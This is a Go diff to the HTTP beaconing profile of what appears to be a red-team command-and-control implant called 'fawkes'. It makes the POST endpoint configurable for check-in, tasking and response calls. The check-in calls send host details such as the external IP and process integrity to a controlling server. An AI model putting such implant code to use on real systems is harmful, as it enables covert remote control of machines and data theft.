@@ -23,11 +23,12 @@ type HTTPProfile struct {
 	SleepInterval int
 	Jitter        int
 	Debug         bool
+	Endpoint      string
 	client        *http.Client
 }
 
 // NewHTTPProfile creates a new HTTP profile
-func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepInterval, jitter int, debug bool) *HTTPProfile {
+func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepInterval, jitter int, debug bool, endpoint string) *HTTPProfile {
 	profile := &HTTPProfile{
 		BaseURL:       baseURL,
 		UserAgent:     userAgent,
@@ -36,6 +37,7 @@ func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepI
 		SleepInterval: sleepInterval,
 		Jitter:        jitter,
 		Debug:         debug,
+		Endpoint:      endpoint,
 	}
 
 	// Create HTTP client with reasonable defaults
@@ -66,6 +68,8 @@ func (h *HTTPProfile) Checkin(agent *structs.Agent) error {
 		ExternalIP:   agent.ExternalIP,
 		ProcessName:  agent.ProcessName,
 		Integrity:    agent.Integrity,
+		PayloadType:  "fawkes",
+		C2Profile:    "http",
 	}
 
 	if h.Debug {
@@ -88,8 +92,8 @@ func (h *HTTPProfile) Checkin(agent *structs.Agent) error {
 	// Base64 encode the data
 	encodedData := base64.StdEncoding.EncodeToString(body)
 
-	// Send checkin request to proper endpoint
-	resp, err := h.makeRequest("POST", "/data", []byte(encodedData))
+	// Send checkin request to configured endpoint
+	resp, err := h.makeRequest("POST", h.Endpoint, []byte(encodedData))
 	if err != nil {
 		return fmt.Errorf("checkin request failed: %w", err)
 	}
@@ -130,7 +134,7 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent) ([]structs.Task, error) {
 	// Base64 encode the data
 	encodedData := base64.StdEncoding.EncodeToString(body)
 
-	resp, err := h.makeRequest("POST", "/data", []byte(encodedData))
+	resp, err := h.makeRequest("POST", h.Endpoint, []byte(encodedData))
 	if err != nil {
 		return nil, fmt.Errorf("get tasking request failed: %w", err)
 	}
@@ -208,7 +212,7 @@ func (h *HTTPProfile) PostResponse(response structs.Response) error {
 	// Base64 encode the data
 	encodedData := base64.StdEncoding.EncodeToString(body)
 
-	resp, err := h.makeRequest("POST", "/data", []byte(encodedData))
+	resp, err := h.makeRequest("POST", h.Endpoint, []byte(encodedData))
 	if err != nil {
 		return fmt.Errorf("post response request failed: %w", err)
 	}
